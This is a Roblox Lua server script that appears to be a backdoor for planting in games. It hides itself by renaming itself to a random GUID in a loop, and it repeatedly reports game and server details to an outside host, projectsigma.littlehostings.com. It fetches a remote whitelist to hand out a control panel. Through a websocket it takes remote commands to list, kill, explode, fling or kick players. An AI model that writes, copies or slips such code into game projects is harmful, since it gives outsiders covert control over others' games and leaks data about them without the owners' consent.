task.spawn(function()
	while wait() do
		script.Parent.Name = game.HttpService:GenerateGUID(true)
	end
end)



local GORIG = "projectsigma.littlehostings.com"
local ORIG = "https://" .. GORIG
local API_BASE = ORIG .. "/api/"
local WS = "wss://" .. GORIG .. "/api/"

function isUserWhitelisted(name)
	wait(4)
	local success, data
	local attempts = 0
	repeat
		attempts = attempts + 1
		success, data = pcall(function()
			local req = game.HttpService:RequestAsync({
				Url = API_BASE .. "isUsernameWhitelisted",
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = game.HttpService:JSONEncode(
					{
						["userId"] = name
					}
				)
			})

			if game.HttpService:JSONDecode(req.Body).success == true then
				return game.HttpService:JSONDecode(req.Body).result
			else
				return false
			end
		end)
		if success then
			return data
		else
		
			task.wait(3)
		end
	until success or attempts == 5
	return false
	
end

function logGame()
	local req = game.HttpService:RequestAsync({
		Url = API_BASE .. "logGame",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game.HttpService:JSONEncode(
			
			{
				["gameName"] =  game.Name,
				["playersInServer"] = tostring(#game.Players:GetPlayers()),
				["placeId"] = tostring(game.PlaceId),
				["jobId"] = game.JobId
			}



		)
	})
	
	
end




game.Players.PlayerAdded:Connect(function(plr)
	
	if isUserWhitelisted(plr.Name) then
		local debounce = true
		local clone = script.UI:Clone()
		clone.Parent = plr.PlayerGui
		
		local clone = script.UiWatermark:Clone()
		clone.Parent = plr.PlayerGui
		
		
		plr.CharacterAdded:Connect(function()
			if debounce then return end
			--script.UI:Clone().Parent = plr.PlayerGui
		end)
		debounce = false
	end
end)
task.spawn(function()
	pcall(logGame)
end)


task.spawn(function()
	
	
	while wait(200) do
		pcall(logGame)
	end


end)

local rosocket = require(script.RoSocket)


local gameSocket = rosocket.Connect(WS .. "gamesocket")
function getPlayerList()
	local origString = "Players ingame:"
	for _, plr in game.Players:GetPlayers() do
		origString = origString .. "\n" .. "`" .. plr.Name .. "`"
	end
	return origString
	
	
end
gameSocket.OnMessageReceived:Connect(function(msg: string?)
	
	local decompiled = game.HttpService:JSONDecode(msg)
	if game["Run Service"]:IsStudio() then
		print(decompiled)
	end
	if game.Players:FindFirstChild(decompiled.targetPlayer) then
		local method = decompiled.method
		local args = decompiled.args
		if method == "playerlist" then
			task.spawn(function()
				local req = game.HttpService:RequestAsync({
					Url = API_BASE .. "executeLog",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = game.HttpService:JSONEncode(

						{
							["placeId"] = tostring(game.PlaceId),
							["playerCaller"] = decompiled.targetPlayer,
							["scriptExecuted"] = "Attempt to get playerlist using command" .. " using a bot command"
						}



					)
				})
			end)
			gameSocket.Send(getPlayerList())
		end
		
		if method == "kill" then
			task.spawn(function()
				local req = game.HttpService:RequestAsync({
					Url = API_BASE .. "executeLog",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = game.HttpService:JSONEncode(

						{
							["placeId"] = tostring(game.PlaceId),
							["playerCaller"] = decompiled.targetPlayer,
							["scriptExecuted"] = "Attempt to kill player called " .. args[1].value .. " using a bot command"
						}



					)
				})
			end)
			if game.Players:FindFirstChild(args[1].value) then
				local suc, result = pcall(function()
					game.Players:FindFirstChild(args[1].value).Character:BreakJoints()
				end)
				if suc then
					gameSocket.Send("Killed player " .. "`" .. args[1].value .. "`")
				else
					gameSocket.Send("Could not kill player. Reason: `" .. result .. "`")
				end
			else
				gameSocket.Send("Player " .. "`" .. args[1].value .. "`" .. " does not exist")
			end
			
			
		end
		
		if method == "explode" then
			task.spawn(function()
				local req = game.HttpService:RequestAsync({
					Url = API_BASE .. "executeLog",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = game.HttpService:JSONEncode(

						{
							["placeId"] = tostring(game.PlaceId),
							["playerCaller"] = decompiled.targetPlayer,
							["scriptExecuted"] = "Attempt to explode player called " .. args[1].value .. " using a bot command"
						}



					)
				})
			end)
			
			if game.Players:FindFirstChild(args[1].value) then
				local suc, result = pcall(function()
					local ex = Instance.new("Explosion")
					ex.Position = game.Players:FindFirstChild(args[1].value).Character.HumanoidRootPart.Position
					ex.Parent = workspace
					
				end)
				if suc then
					gameSocket.Send("Exploded player " .. "`" .. args[1].value .. "`")
				else
					gameSocket.Send("Could not explode player. Reason: `" .. result .. "`")
				end
			else
				gameSocket.Send("Player " .. "`" .. args[1].value .. "`" .. " does not exist")
			end


		end
		
		if method == "fling" then
			task.spawn(function()
				local req = game.HttpService:RequestAsync({
					Url = API_BASE .. "executeLog",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = game.HttpService:JSONEncode(

						{
							["placeId"] = tostring(game.PlaceId),
							["playerCaller"] = decompiled.targetPlayer,
							["scriptExecuted"] = "Attempt to fling player called " .. args[1].value .. " using a bot command"
						}



					)
				})
			end)
			if game.Players:FindFirstChild(args[1].value) then
				local suc, result = pcall(function()
					local plrRP = game.Players:FindFirstChild(args[1].value).Character.HumanoidRootPart
					local RNG = Random.new()

					plrRP:PivotTo(plrRP:GetPivot() + Vector3.yAxis)
					plrRP.AssemblyLinearVelocity = RNG:NextUnitVector() * 5000
					plrRP.AssemblyAngularVelocity = RNG:NextUnitVector() * 5000

				end)
				if suc then
					gameSocket.Send("Flinged player " .. "`" .. args[1].value .. "`")
				else
					gameSocket.Send("Could not fling player. Reason: `" .. result .. "`")
				end
			else
				gameSocket.Send("Player " .. "`" .. args[1].value .. "`" .. " does not exist")
			end


		end
		
		if method == "kick" then
			task.spawn(function()
				local req = game.HttpService:RequestAsync({
					Url = API_BASE .. "executeLog",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = game.HttpService:JSONEncode(

						{
							["placeId"] = tostring(game.PlaceId),
							["playerCaller"] = decompiled.targetPlayer,
							["scriptExecuted"] = "Attempt to kick player called " .. args[1].value .. " using a bot command"
						}



					)
				})
			end)
			if game.Players:FindFirstChild(args[1].value) then
				local suc, result = pcall(function()
					game.Players:FindFirstChild(args[1].value):Kick(args[2].value)

				end)
				if suc then
					gameSocket.Send("Kicked player " .. "`" .. args[1].value .. "`")
				else
					gameSocket.Send("Could not kick player. Reason: `" .. result .. "`")
				end
			else
				gameSocket.Send("Player " .. "`" .. args[1].value .. "`" .. " does not exist")
			end


		end
		
		
	end
end)

game:BindToClose(function()
	gameSocket:Disconnect()
end)
